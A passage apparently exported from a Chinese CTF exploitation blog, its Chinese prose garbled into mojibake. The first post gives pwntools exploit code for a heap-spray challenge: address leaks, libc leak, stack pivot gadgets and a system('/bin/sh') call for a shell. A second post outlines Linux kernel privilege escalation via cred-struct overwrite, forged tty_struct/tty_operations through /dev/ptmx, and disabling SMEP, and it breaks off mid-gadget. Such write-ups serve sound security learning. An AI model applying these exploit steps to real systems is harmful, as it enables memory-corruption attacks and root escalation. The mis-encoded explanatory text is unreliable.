*(*(chunk_addr+size))+0x4\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-06-41.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-07-14.png)\n\nè¿™é‡Œè°ƒç”¨CallFunctionå‡½æ•°ä¹‹åå°±å¯ä»¥è°ƒç”¨åˆ°0xf7e87401ï¼Œè¿™é‡Œçš„*0x57d1ab8cæ˜¯æˆ‘ä»¬åœ¨å †ä¸Šè®¾ç½®å¥½çš„å†…å®¹ã€‚\n\n2.æ¼æ´å‘ç°ï¼š\n\nè¿™é‡Œå°±ç»“åˆCreateå‡½æ•°ï¼Œåˆ©ç”¨å…ˆç”³è¯·å¡«å……å†…å®¹ä¹‹åå†é‡Šæ”¾ï¼Œä½¿å¾—*(chunk_addr+size)å¯æ§ï¼Œä»è€Œèƒ½å¤Ÿè°ƒç”¨ä»»æ„å‡½æ•°ã€‚ä½†æ˜¯åœ¨ä¿æŠ¤å…¨å¼€çš„æƒ…å†µä¸‹æƒ³è¦è°ƒç”¨å‡½æ•°ï¼Œå¿…é¡»éœ€è¦æ³„éœ²åœ°å€ï¼Œè€Œåœ°å€åœ¨æ²¡æœ‰æ¼æ´çš„æƒ…å†µä¸‹åˆæ²¡åŠæ³•æ³„éœ²ã€‚\n\nå †å–·åŸç†ï¼šhttps://www.cnblogs.com/Fang3s/articles/3911561.html\n\n(1)å †å–·ç»“åˆCallFunctionå‡½æ•°çš„-1æ³„éœ²åœ°å€ï¼š\n\nå‡è®¾æŸä¸ªå †åœ°å€ï¼šmagic_addrã€‚ç”±äºè¿™é‡Œå¯ä»¥Displayï¼Œæ‰€ä»¥å¦‚æœ*magic_addr= magic_addr-1ï¼Œè€Œåˆ©ç”¨å †å–·ä½¿å¾—ä¸€å®šèŒƒå›´å†…çš„å †å†…å®¹éƒ½ä¸ºmagic_addrï¼Œæ‰“å°å†…å®¹ä¹‹åï¼Œå°±å¯ä»¥ä¾æ®æ‰“å°çš„å†…å®¹ï¼Œèƒ½å¤Ÿä»ä¸­ç­›é€‰å‡ºmagic_addrï¼Œè·å–å…¶ç´¢å¼•ï¼Œå†ç»è¿‡æˆ‘ä»¬åˆ¶é€ å †å–·è¿‡ç¨‹ä¸­è¿ç®—å°±èƒ½å¾—åˆ°å¼€å§‹å †å–·çš„åœ°å€start_addrã€‚\n\næ¯”å¦‚ï¼šmagic_addr = 0x58585858ï¼Œç”³è¯·äº†0x100ä¸ª0x20000å¤§å°çš„Chunkï¼Œé‚£ä¹ˆå¾—åˆ°ç´¢å¼•ä¸º0x58ï¼Œä¸”magic_addr ä¹Ÿæ˜¯ä¸€ä¸ª0x20000çš„chunkï¼Œå°±å¯æ±‚å¾—start_addrä¸º0x58585858-0x58*0x20000ã€‚å½“ç„¶è¿™æ˜¯ç†è®ºä¸Šçš„ï¼Œå®é™…è¿˜å¾—ä¸€ç³»åˆ—çš„åˆ¤æ–­è¿ç®—ã€‚\n\nåŒç†ï¼Œåœ¨å½“æˆ‘ä»¬é‡Šæ”¾å †å—è¿›å…¥unsortedbinä¹‹åï¼Œè¸©ä¸‹main_arenaåœ°å€å†ç”³è¯·å›æ¥ï¼Œç”±äº\\x00æˆªæ–­å¾ˆéš¾æ³„éœ²å‡ºåœ°å€ï¼Œè¿™é‡Œä¹Ÿæ˜¯é‡‡ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œä½¿å¾—\\x00-1æˆä¸º0xffæ¥æŠŠ\\x00æˆªæ–­ç»™æŠ¹æ€ã€‚\n\n(2)æœ‰äº†åœ°å€ä¹‹åå°±å¯è°ƒç”¨libcä¸Šä»»æ„çš„å‡½æ•°äº†ï¼Œè¿™é‡Œçš„one_gadgetéƒ½ç”¨ä¸äº†ï¼Œåœ¨æ²¡åŠæ³•å¾€æ ˆä¸Šè¾“å…¥æ•°æ®çš„æƒ…å†µä¸‹å°±éœ€è¦æ ˆåŠ«æŒäº†ï¼Œè¿™é‡Œæ‰¾ä¸¤ä¸ªgadgetï¼ŒåŸé¢˜ç»™çš„æ˜¯ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nmagic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword ptr[eax]\nmagic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\næˆ‘ç”¨æˆ‘è‡ªå·±ç¼–è¯‘çš„Libcæ˜¯ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nmagic_gadget1 = 0x00164401# 0x00161871 : xchg eax, ecx ; cli ; jmp dword ptr[eax]\nmagic_gadget2 = 0x00073c10+0x3a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\nä¸€æ ·çš„ï¼Œæ²¡å•¥åŒºåˆ«ï¼Œå¾—è‡ªå·±æ‰¾å»ã€‚ROPgadgetã€‚\n\nåœ¨è°ƒç”¨jmp *(*(chunk_addr+size))+0x4æ—¶ï¼Œçœ‹åˆ°contextä¸º\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-38-18.png)\n\nè¿™é‡Œçš„ecxå°±ä¿å­˜è¿™ä¸€ä¸ªå †åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åˆ©ç”¨ecxå’Œeaxç»“åˆè¿™ä¸¤ä¸ªgdagetæ¥è¿›è¡Œæ ˆåŠ«æŒï¼Œä»è€Œgetshellã€‚\n\n3.expç¼–å†™ï¼š\n\n(1)å †å–·å †å¸ƒå±€ï¼Œå¡«å……æ•°æ®åœ¨å †ä¸Šï¼Œæ»¡è¶³*magic_addr=magic_addrï¼Œä¸”å…¶ä»–chunkçš„æ‰€æœ‰æ•°æ®ä¹Ÿä¸ºmagic_addr\n\n```python\n#æ³¨é‡Šå¤´\n\n#----------------------------------------\n#fill 0x58 to all chunk\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x20000 - 1), 1])\nmalloc(0x20000, data)\ndelete()\n\nfor i in range(0x10):\n    malloc(0x20000, data)\n\n#idx 0x0->0x100-1\n#----------------------------------------\n```\n\n(2)å¡«å……éœ€è¦è§¦å‘çš„chunkæ•°æ®ï¼Œæ»¡è¶³*chunk_addr + size = magic_addrï¼Œç„¶åè°ƒç”¨callfucå‡½æ•°ä½¿å¾—*magic_addr= magic_addr-1ï¼Œæ‰“å°æ•°æ®ä¹‹åå³å¯åˆ¤æ–­ã€‚\n\n```python\n#-----------------------------------------------\n#fill 0x1000 all 0x58 (idx 0x100->0x110-1)\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x1000 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\n\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0xf0 - 1), 0])\nmalloc(0xf0, data)\n#idx 0x100->0x110-1\n\n\n#0x100->0x110-1 OK\ncallfuc(0x100)\nshow(0, 0x100)\n#-----------------------------------------------\n```\n\n(3)åˆ¤æ–­chunkåŸºäºçš„BigChunkç´¢å¼•ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nindex = 0\noffest = 0\nout = ''\nmagic_addr = 0x58585858\nfor i in range(0x100):\n    out = p.recvline()\n    if 'W' in out:\n        index = i\n        break\nout = out[12 : ]\noffest = out.index('W')\n\nlog.info('magic_addr is : %d' % index)\nlog.info('offest is : %d' % offest)\nlog.info('start addr is : ' + hex(magic_addr- offest))\nblock_start = (index / 0x10) * 0x10\n```\n\n(4)è®¡ç®—chunkåœ¨BigChunkä¸­çš„ä½ç½®ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\ndelete()\ncount = 1\np_index = 0\nwhile 1:\n    log.info(\"start find prev block count = %d\" % count)\n    data = []\n    for i in range(0x10):\n        data.append([p32(magic_addr - 0x20008 * count) * (0x1000 / 4 - 1),\n1])\n    malloc(0x1000, data)\n    delete()\n\n    data = []\n    for i in range(0x10):\n        data.append(['X' * (0xa0 - 1), 0])\n    malloc(0xa0, data)\n\n    log.info(\"start call fuc count = %d\" % count)\n    callfuc(0x100)\n    show(block_start - 0x10, index + 1)\n    p_index = 0\n    out = ''\n    for i in range(index + 1 - block_start + 0x10):\n        out = p.recvline()\n        if 'W' in out:\n            p_index = i + block_start - 0x10\n            break\n    delete()\n    if p_index < block_start:\n        break\n    count += 1\n\n\nlog.info('block start is : %d' % block_start)\nlog.info('p_index is : %d' % p_index)\nheap_start_addr = magic_addr - 0x20008 * (count - 1 + 0x10 * (block_start / 0x10)) - offest - 8\nlog.info('heap start is : ' + hex(heap_start_addr))\n```\n\nåŒæ ·çš„æ–¹æ³•ï¼Œä¾æ®åœ°å€é¡ºåºéå†BigChunkä¸­çš„0x1-0x10çš„æ‰€æœ‰å¯èƒ½èŒƒå›´ï¼Œå¯¹äºä¿®æ”¹*chunk_addr= magic_addr-1ï¼Œç„¶åæ‰“å°åˆ¤æ–­å¾—åˆ°å„ä¸ªç´¢å¼•å¯¹åº”çš„åœ°å€ã€‚ç”±äºåˆ›å»ºçš„æ—¶å€™æ˜¯randomå‡½æ•°ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨çˆ†ç ´çš„æ–¹å¼è§£å†³ï¼Œæ¦‚ç‡ä¸º1/16ã€‚\n\n(5)è·å–libcåœ°å€ï¼Œæ–¹æ³•æ˜¯é‡Šæ”¾ä¹‹åä½¿ä¹‹è¿›å…¥unsortedbinè¸©ä¸‹åœ°å€ï¼Œåˆ©ç”¨callfucå‡½æ•°å’Œå­—èŠ‚é”™ä½çš„æ–¹æ³•å¯¹æŠ—\\x00æˆªæ–­ä»è€Œæ³„éœ²å‡ºåœ°å€ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nfor i in range(0x10):\n    delete()\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append(['aaa', 0])\nmalloc(0xa0, data)\ncallfuc(0)\nshow(0, 0x10)\nfor i in range(index + 1 - block_start + 0x10):\n    out = p.recvline()\n    out = out[12 : -1]\n    if 'aaa' != out:\n        libc_addr = u32(out[4 : 8]) + 1 - 0x1b07b0\n        break\nlog.info('libc addr is : ' + hex(libc_addr))\ndelete()\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\nè¿™é‡Œçš„main_arenaå˜åŒ–æ˜¯å› ä¸º0xedb7ab000å˜ä¸ºäº†0xedb7afffï¼Œå¯¼è‡´å­—èŠ‚é”™ä½å˜åŒ–çš„ï¼Œå…·ä½“è°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“\n\n(6)åŠ«æŒæ ˆï¼Œç»“åˆgadgetæ¥getshellã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nmagic_gadget1 = 0x00164401       \n#xchg eax, ecx ; cli ; jmp dword ptr[eax] \nmagic_gadget2 = 0x00073c10+0x3a  \n#xchg eax, esp ; sal bh, 0xd8 ;\nsystem_offest = 0x3adb0\nbinsh_addr = 0x15bb0b\n# gdb.attach(p)\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append([(p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr\n+ magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +\np32(libc_addr + binsh_addr)).ljust(0xa0 -1, '\\x00'), 0])\nmalloc(0xa0, data)\ncallfuc(0)\np.interactive()\n```\n\nè¿™é‡Œå…³äºæœ€åå †ä¸Šæ•°æ®çš„å¸ƒå±€éœ€è¦è°ƒè¯•æ‰èƒ½çŸ¥é“ï¼Œå»ºè®®å…ˆéšä¾¿å†™å‡ ä¸ªï¼Œç„¶åè°ƒè¯•çš„æ—¶å€™åœ¨å†™æ•°æ®ã€‚\n\nâ–²é¢˜å¤–è¯ï¼šè¿™é‡Œå…¶å®å¹¶æ²¡æœ‰ç”¨åˆ°å¸¸è§„æ„ä¹‰ä¸Šçš„é€šè¿‡å †å–·æ»‘æ¿0x0cï¼Œ0x58ä¹‹ç±»çš„æ»‘æ¿æŒ‡ä»¤æ¥æ‰§è¡Œshellcodeæˆ–è€…ROPï¼Œæ‰€ä»¥å…¶å®è¿™é‡Œçš„magic_addræ¢æˆ0x57575757ï¼Œ0x56565656ä¹Ÿæ˜¯ä¸€æ ·å¯ä»¥çš„ï¼Œåªä¸è¿‡æˆåŠŸç‡å¯èƒ½ä¼šå°ä¸å°‘ï¼Œæ¯•ç«Ÿè¿™é‡Œè¿˜æœ€å¼€å§‹ç”³è¯·äº†ä¸€ä¸ªéšæœºå¤§å°çš„å †å—ï¼Œè€Œä¸”PIEå †çš„éšæœºåŒ–ç¨‹åº¦ä¹Ÿå¤§å¤šåœ¨0x56åˆ°0x58ä¹‹é—´ã€‚\n\n4.æ€»ç»“ï¼š\n\n(1)å †å–·æ€æƒ³ï¼šå…¶å®å°±æ˜¯å¤šçº§æŒ‡é’ˆçš„æ€æƒ³ï¼Œé€šè¿‡åŠ«æŒæŒ‡é’ˆæ¥æ»‘åŠ¨ç¨‹åºæµæˆ–è€…æ³„éœ²åœ°å€ã€‚\n\n(2)è°ƒè¯•ï¼šæ±‡ç¼–æŒ‡ä»¤ä¸€å®šè¦ç†Ÿæ‚‰ï¼ŒåƒåŠ«æŒæ ˆå¸¸ç”¨çš„xchg eax,espç­‰ã€‚\n\n \n\n ","tags":["Heap-spray"],"categories":["PWN","pwnå †-spray"]},{"title":"pwn-kernel_å¸¸è§ææƒæ‰‹æ®µ","url":"/2021/08/18/pwn-kernel_å¸¸è§ææƒæ‰‹æ®µ/","content":"\nä¸€ã€åˆ©ç”¨credç»“æ„ä½“ææƒï¼š\n\n1.å‰ç½®çŸ¥è¯†ï¼š\n\n(1)kernelä¸­ä¼šä¸ºæ¯ä¸ªè¿›ç¨‹åˆ›å»ºä¸€ä¸ªcredç»“æ„ä½“ï¼Œä¿å­˜äº†è¯¥è¿›ç¨‹çš„æƒé™ç­‰ä¿¡æ¯å¦‚ï¼ˆuidï¼Œgidï¼‰ç­‰ï¼Œå¦‚æœèƒ½ä¿®æ”¹è¿™ä¸ªç»“æ„ä½“é‚£ä¹ˆå°±ä¿®æ”¹äº†è¿™ä¸ªè¿›ç¨‹çš„æƒé™ã€‚\n\n(2)ä¿®æ”¹è¿›ç¨‹çš„æƒé™ä¸ºrootä¹‹åï¼Œå†é€šè¿‡è¯¥è¿›ç¨‹å¼€çš„shellé‚£ä¹ˆä¹Ÿå°±æ˜¯rootæƒé™äº†ï¼Œå®ç°ææƒã€‚\n\n2.åˆ©ç”¨æ‰‹æ®µï¼š\n\n(1)é€šè¿‡UAFï¼Œå°†ä¸€å—å·²ç»é‡Šæ”¾çš„å †å—ä¿®æ”¹å¤§å°ä¸ºcredç»“æ„ä½“å¤§å°ï¼Œç„¶ååˆ›å»ºè¿›ç¨‹ï¼Œå°±ä¼šå°†è¯¥å †å—ç”³è¯·ä¸ºcredç»“æ„ä½“ã€‚\n\n(2)å†é€šè¿‡UAFå°†è¯¥credç»“æ„ä½“ä¸­çš„uidã€gidæ”¹æ‰ï¼Œå®ç°è¿›ç¨‹ææƒã€‚\n\nâ–²é‚£ä¹ˆå¦‚ä½•çŸ¥é“credç»“æ„ä½“çš„å¤§å°å‘¢ï¼Œä¸åŒlinuxå†…æ ¸ç‰ˆæœ¬çš„credç»“æ„ä½“å¤§å°ä¸åŒï¼š\n\nâ‘ é€šè¿‡linuxå†…æ ¸ç‰ˆæœ¬ï¼Œä¸Šæºç æŸ¥çœ‹ç½‘å€ï¼ŒæŸ¥æ‰¾å¯¹åº”çš„credç»“æ„ä½“ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458125.jpeg)\n\nè®¿é—®å¯¹åº”ç‰ˆæœ¬ï¼šhttps://elixir.bootlin.com/linux/v4.4.70/source/include/linux/cred.h\n\nå¯ä»¥çœ‹åˆ°æŸå†…æ ¸çš„credç»“æ„ä½“å¤§å°ï¼Œè¿™é‡Œæ˜¯0xa8ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nstruct cred {\n    atomic_t usage; 0x4\n    #ifdef CONFIG_DEBUG_CREDENTIALS debugé€‰é¡¹å»æ‰\n    atomic_t subscribers; /* number of processes subscribed */\n    void *put_addr;\n    unsigned magic;\n    #define CRED_MAGIC 0x43736564\n    #define CRED_MAGIC_DEAD 0x44656144\n    #endif\n    kuid_t uid; /* real UID of the task */ 0x4\n    kgid_t gid; /* real GID of the task */ 0x4\n    kuid_t suid; /* saved UID of the task */ 0x4\n    kgid_t sgid; /* saved GID of the task */ 0x4\n    kuid_t euid; /* effective UID of the task */ 0x4\n    kgid_t egid; /* effective GID of the task */ 0x4\n    kuid_t fsuid; /* UID for VFS ops */ 0x4\n    kgid_t fsgid; /* GID for VFS ops */ 0x4\n    unsigned securebits; /* SUID-less security management */ 0x4\n    kernel_cap_t cap_inheritable; /* caps our children can inherit */ 0x8\n    kernel_cap_t cap_permitted; /* caps we're permitted */ 0x8\n    kernel_cap_t cap_effective; /* caps we can actually use */ 0x8\n    kernel_cap_t cap_bset; /* capability bounding set */ 0x8\n    kernel_cap_t cap_ambient; /* Ambient capability set */ 0x8\n    #ifdef CONFIG_KEYS\n    unsigned char jit_keyring; /* default keyring to attach requested 0x8\n    * keys to */\n    struct key __rcu *session_keyring; /* keyring inherited over fork */ 0x8\n    struct key *process_keyring; /* keyring private to this process */ 0x8\n    struct key *thread_keyring; /* keyring private to this thread */ 0x8\n    struct key *request_key_auth; /* assumed request_key authority */ 0x8\n    #endif\n    #ifdef CONFIG_SECURITY\n    void *security; /* subjective LSM security */ 0x8\n    #endif\n    struct user_struct *user; /* real user ID subscription */ 0x8\n    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ 0x8\n    struct group_info *group_info; /* supplementary groups for euid/fsgid */ 0x8\n    struct rcu_head rcu; /* RCU deletion hook */ 0x10\n};\n```\n\nè¿™é‡Œå¤§å°æ˜¯å»æ‰debugéƒ¨åˆ†çš„æˆå‘˜çš„å¤§å°ï¼Œå› ä¸ºé¢˜ç›®ç»™çš„bzImageå†…æ ¸æ–‡ä»¶ä¸€èˆ¬éƒ½ä¸åŒ…å«debugé€‰é¡¹ï¼ŒåŒ…å«çš„è¯ä¼šç‰¹åˆ«å¤§ï¼Œè¿™é‡Œåé¢æ ‡æ³¨çš„å¤§å°æ˜¯æŸä¸ªå¤§ä½¬æ ‡æ³¨ï¼š\n\nhttps://www.jianshu.com/p/a465b3f6d7cb\n\nâ‘¡ç›´æ¥è‡ªå·±å†™ä¸€ä¸ªå°moduleåŠ è½½æ‰“å°credç»“æ„ä½“å¤§å°ï¼š\n\n```\n//ç®€å•modules\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/cred.h>\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\nstruct cred c1;\nstatic int hello_init(void)\n{\n    printk(\"<1> Hello world!\\n\");\n    printk(\"size of cred : %d \\n\",sizeof(c1));\n    return 0;\n}\nstatic void hello_exit(void)\n{\n    printk(\"<1> Bye, cruel world\\n\");\n}\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nA.æ–°å»ºä¸€ä¸ªhelloæ–‡ä»¶å¤¹ï¼Œæ”¾ä¸Šè¿°ä»£ç hello.cå’ŒMakefileï¼Œè®¾ç½®Makefileä¸ºï¼š\n\n```\nobj-m := hello.o\n\nKERNELDR := /usr/src/linux-headers-4.15.0-22-generic\n\nPWD := $(shell pwd)\n\nmodules:\n$(MAKE) -C $(KERNELDR) M=$(PWD) modules\n\nmoduels_install:\n$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install\n\nclean:\nrm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions\n```\n\nè¿™é‡Œçš„KERNELDRç›®å½•æ˜¯ç¼–è¯‘ä¹‹åçš„kernelç›®å½•\n\nmakeå‘½ä»¤ç¼–è¯‘ä¸‹è¿™ä¸ªhello.cï¼Œä¼šç”Ÿæˆå‡ ä¸ªæ–‡ä»¶ï¼Œåªéœ€è¦hello.ko\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458099.jpeg)\n\nB.åœ¨æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­vim initï¼Œè®¾ç½®ä¸€ä¸‹ï¼ŒåŠ ä¸Šinsmod /hello.koï¼Œå†é‡æ–°æ‰“åŒ…ï¼Œé€šè¿‡qemuå¯åŠ¨å†…æ ¸ï¼Œå¯åŠ¨å‘½ä»¤ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nqemu-system-x86_64 \\\n-m 128M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr\" \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\nè¿™é‡Œä¸èƒ½åœ¨appendä¸­æ·»åŠ quietå‘½ä»¤ï¼Œå¦åˆ™æ²¡æ³•æ‰“å°å‡ºæ¥\n\nC.ä¹‹åå°±å¯ä»¥çœ‹åˆ°\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458400.jpeg)\n\nå‚ç…§ï¼š[https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/](https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-åˆæ¢-1/)\n\n(3)ä¸€èˆ¬è€Œè¨€ï¼Œä¿®æ”¹credç»“æ„ä½“å¯ä»¥ç›´æ¥ä»å¤´å¼€å§‹ï¼Œå°†å¤´éƒ¨è‡³gidçš„éƒ¨åˆ†éƒ½èµ‹å€¼ä¸º0å³å¯ï¼Œå› ä¸ºå‰é¢çš„æ•°æ®åŸºæœ¬ç”¨ä¸åˆ°ï¼Œä¸éœ€è¦å†å»æ‰¾åŸå§‹æ•°æ®æ¥èµ‹å€¼ã€‚\n\näºŒã€åˆ©ç”¨ptmxè®¾å¤‡ä¸­çš„tty_structç»“æ„ä½“\n\n1.å‰ç½®çŸ¥è¯†ï¼š\n\n(1)æ‰“å¼€è®¾å¤‡ï¼Œopen(\"/dev/ptmx\", O_RDWR)æ—¶ä¼šåˆ›å»ºä¸€ä¸ªtty_struct\n\n(2)tty_structç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªconst struct tty_operations *ops;ç»“æ„ä½“æŒ‡é’ˆï¼Œåç§»ä¸ºxxã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nstruct tty_struct {\n    int magic;\n    struct kref kref;\n    struct device *dev;\n    struct tty_driver *driver;\n    const struct tty_operations *ops;\n    int index;\n\n    /* Protects ldisc changes: Lock tty not pty */\n    struct ld_semaphore ldisc_sem;\n    struct tty_ldisc *ldisc;\n\n    struct mutex atomic_write_lock;\n    struct mutex legacy_mutex;\n    struct mutex throttle_mutex;\n    struct rw_semaphore termios_rwsem;\n    struct mutex winsize_mutex;\n    spinlock_t ctrl_lock;\n    spinlock_t flow_lock;\n    /* Termios values are protected by the termios rwsem */\n    struct ktermios termios, termios_locked;\n    struct termiox *termiox; /* May be NULL for unsupported */\n    char name[64];\n    struct pid *pgrp; /* Protected by ctrl lock */\n    struct pid *session;\n    unsigned long flags;\n    int count;\n    struct winsize winsize; /* winsize_mutex */\n    unsigned long stopped:1, /* flow_lock */\n        flow_stopped:1,\n        unused:BITS_PER_LONG - 2;\n    int hw_stopped;\n    unsigned long ctrl_status:8, /* ctrl_lock */\n        packet:1,\n        unused_ctrl:BITS_PER_LONG - 9;\n    unsigned int receive_room; /* Bytes free for queue */\n    int flow_change;\n\n    struct tty_struct *link;\n    struct fasync_struct *fasync;\n    int alt_speed; /* For magic substitution of 38400 bps */\n    wait_queue_head_t write_wait;\n    wait_queue_head_t read_wait;\n    struct work_struct hangup_work;\n    void *disc_data;\n    void *driver_data;\n    struct list_head tty_files;\n\n#define N_TTY_BUF_SIZE 4096\n\n    int closing;\n    unsigned char *write_buf;\n    int write_cnt;\n    /* If the tty has a pending do_SAK, queue it here - akpm */\n    struct work_struct SAK_work;\n    struct tty_port *port;\n};\n```\n\nç»“æ„ä½“å¤§å°ä¸º0x2e0ï¼Œä½†æ˜¯ä¸çŸ¥é“å„ä¸ªç‰ˆæœ¬çš„å¤§å°æ˜¯ä¸æ˜¯éƒ½ä¸€æ ·ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹å¤§å°ï¼Œä»ç„¶å¯ä»¥ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œå»ç½‘ç«™ï¼Œæˆ–è€…ç¼–è¯‘ä¸€ä¸ªå°module\n\nç½‘ç«™ï¼šhttps://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h\n\nmoduleï¼šå‚ç…§ä¸Šé¢çš„ï¼Œæ‰“å°å³å¯ã€‚\n\n(3)tty_operationsç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªint (*write)(struct tty_struct * tty,\nconst unsigned char *buf, int count); å‡½æ•°æŒ‡é’ˆï¼Œè¿™ä¸ªå‡½æ•°åœ¨ä¸ptmxè®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œè°ƒç”¨writeå‡½æ•°æ—¶å°±ä¼šè°ƒç”¨è¯¥å‡½æ•°ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nstruct tty_operations {\n    struct tty_struct * (*lookup)(struct tty_driver *driver,\n    struct inode *inode, int idx);\n    int (*install)(struct tty_driver *driver, struct tty_struct *tty);\n    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n    int (*open)(struct tty_struct * tty, struct file * filp);\n    void (*close)(struct tty_struct * tty, struct file * filp);\n    void (*shutdown)(struct tty_struct *tty);\n    void (*cleanup)(struct tty_struct *tty);\n    int (*write)(struct tty_struct * tty,\n        const unsigned char *buf, int count);\n    int (*put_char)(struct tty_struct *tty, unsigned char ch);\n    void (*flush_chars)(struct tty_struct *tty);\n    int (*write_room)(struct tty_struct *tty);\n    int (*chars_in_buffer)(struct tty_struct *tty);\n    int (*ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    long (*compat_ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);\n    void (*throttle)(struct tty_struct * tty);\n    void (*unthrottle)(struct tty_struct * tty);\n    void (*stop)(struct tty_struct *tty);\n    void (*start)(struct tty_struct *tty);\n    void (*hangup)(struct tty_struct *tty);\n    int (*break_ctl)(struct tty_struct *tty, int state);\n    void (*flush_buffer)(struct tty_struct *tty);\n    void (*set_ldisc)(struct tty_struct *tty);\n    void (*wait_until_sent)(struct tty_struct *tty, int timeout);\n    void (*send_xchar)(struct tty_struct *tty, char ch);\n    int (*tiocmget)(struct tty_struct *tty);\n    int (*tiocmset)(struct tty_struct *tty,\n        unsigned int set, unsigned int clear);\n    int (*resize)(struct tty_struct *tty, struct winsize *ws);\n    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);\n    int (*get_icount)(struct tty_struct *tty,\n    struct serial_icounter_struct *icount);\n#ifdef CONFIG_CONSOLE_POLL\n    int (*poll_init)(struct tty_driver *driver, int line, char *options);\n    int (*poll_get_char)(struct tty_driver *driver, int line);\n    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);\n#endif\n    const struct file_operations *proc_fops;\n};\n```\n\nè¿™ä¸ªç»“æ„ä½“åœ¨ä¼ªé€ çš„æ—¶å€™å°±å¯ä»¥éšä¾¿ä¼ªé€ äº†ï¼Œåªè¦å‡½æ•°åç§»ä½ç½®å¯¹å°±è¡Œã€‚\n\n(4)æ‰€ä»¥æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªtty_structç»“æ„ä½“fake_tty_1ï¼Œåˆ©ç”¨UAFæ¼æ´å°†ä¸€ä¸ªå †å—ç”³è¯·ä¸ºè¿™ä¸ªç»“æ„ä½“ï¼Œä¿®æ”¹å…¶const struct tty_operations *ops;ç»“æ„ä½“æŒ‡é’ˆæŒ‡å‘å¦ä¸€ä¸ªä¼ªé€ çš„tty_operationsç»“æ„ä½“fake_tty_2ã€‚\n\n(5)å°†tty_operationsç»“æ„ä½“fake_tty_2ä¸­çš„int (*write)(struct tty_struct * tty,\nconst unsigned char *buf, int count); å‡½æ•°æŒ‡é’ˆæŒ‡å‘ROPé“¾ï¼Œè°ƒç”¨ROPï¼Œæ§åˆ¶ç¨‹åºã€‚\n\n(6)æ§åˆ¶ç¨‹åºä¹‹åä¸€èˆ¬éœ€è¦å…³é—­æ‰smepä¿æŠ¤ï¼Œä¹‹åç”¨ret2Usræ¥ææƒã€‚\n\nâ–²å…³é—­smepä¿æŠ¤ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458313.jpeg)\n\néœ€è¦å°†CR4å¯„å­˜å™¨ä¸­çš„ç¬¬20ä½ç½®0ï¼Œå³å¯å…³é—­ã€‚ä¸€èˆ¬åœ¨ROPé“¾ä¸­æ‰§è¡Œä¸‹åˆ—gadgetå³å¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov cr4,0x6f0; 